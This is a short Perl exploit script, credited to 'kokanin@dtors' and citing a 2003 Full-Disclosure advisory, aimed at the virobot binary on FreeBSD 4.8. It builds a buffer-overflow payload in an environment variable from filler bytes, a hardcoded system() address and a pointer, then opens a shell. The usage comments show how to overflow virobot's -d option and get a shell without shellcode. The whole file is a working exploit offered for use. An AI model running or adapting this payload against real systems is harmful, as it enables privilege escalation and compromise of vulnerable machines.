#!/usr/bin/perl -w
# virobot freebsd edition, might need tweaking but works on my 4.8-RELEASE.
# advisory written by KF at:
# http://lists.netsys.com/pipermail/full-disclosure/2003-August/008672.html
# this is an ugly hack, I am tired and heading for bed.
# kokanin@dtors
# $ perl ./DSR-virobot.pl
# $ /path/to/virobot -d $STR
# # echo look mommy no shellcode 

$fill = "A" x 256;
$dummy = pack("l",0x41424344);
$system = pack("l",0x08048e08);
$pointer = pack("l",0x2819d780);
local($ENV{'STR'}) = $fill . $dummy . $system x 2 . $dummy . $pointer;
system("sh");
